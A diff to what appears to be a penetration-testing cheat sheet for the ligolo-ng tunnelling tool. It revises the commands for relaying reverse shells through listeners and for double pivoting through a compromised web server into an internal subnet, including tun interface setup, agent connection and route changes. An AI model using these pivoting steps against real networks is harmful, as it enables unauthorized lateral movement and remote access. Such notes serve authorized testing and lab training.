@@ -41,21 +41,26 @@ To catch reverse shells, add listeners:
 ```shell
 # Run the agent at port 1234 and redirect
 # the traffic to port 4444 on our machine.
-listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
+listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4444
 ```
 
 For double pivoting use the following commands:
 
 ```shell
-# Add a new listener
-listener_add --addr 0.0.0.0:11601 --to 0.0.0.0:11601
+# Create and start a new tun interface
+sudo ip tuntap add user $USER mode tun ligolo1
+sudo ip link set ligolo1 up
+
+# Add a new listener on the same port you are using for first pivot
+listener_add --addr 0.0.0.0:443 --to 0.0.0.0:443
 
 # Use the IP of the compromised web server using our newly added listener.
-./agent.exe -connect 172.16.5.15:11601 -ignore-cert
+./agent.exe -connect 172.16.5.15:443 -ignore-cert
 
 # Switch sessions on attack machine
 ligolo > session
+ligolo > tunnel_start --tun ligolo1
 
 # Add new subnet to ligolo routes
-sudo ip route add <subnet> dev ligolo
+sudo ip route add <subnet> dev ligolo1
 ```
